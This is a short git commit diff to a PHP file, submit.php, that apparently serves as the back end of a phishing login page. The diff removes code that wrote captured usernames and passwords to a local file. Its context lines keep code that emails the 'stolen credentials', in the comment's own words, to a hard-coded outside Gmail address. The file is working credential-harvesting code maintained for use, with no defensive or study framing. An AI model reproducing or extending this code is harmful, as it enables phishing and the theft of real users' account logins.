c574260f7f1fabadf89d1719b069e82b52767ef1
cmhall21 <109685572+cmhall21@users.noreply.github.com>
2024-04-13 20:50:13 -0500

    Update submit.php

--- submit.php
+++ submit.php
@@ -2,12 +2,6 @@
   $username = $_POST['username'];
   $password = $_POST['password'];
 
-  // Save the login credentials to a file
-  $file = fopen("credentials.txt", "w");
-  fwrite($file, "Username: " . $username . "\n");
-  fwrite($file, "Password: " . $password);
-  fclose($file);
-
   // Send the stolen credentials to your email address
   $to = "v91339441@gmail.com";
   $subject = "Stolen Credentials";
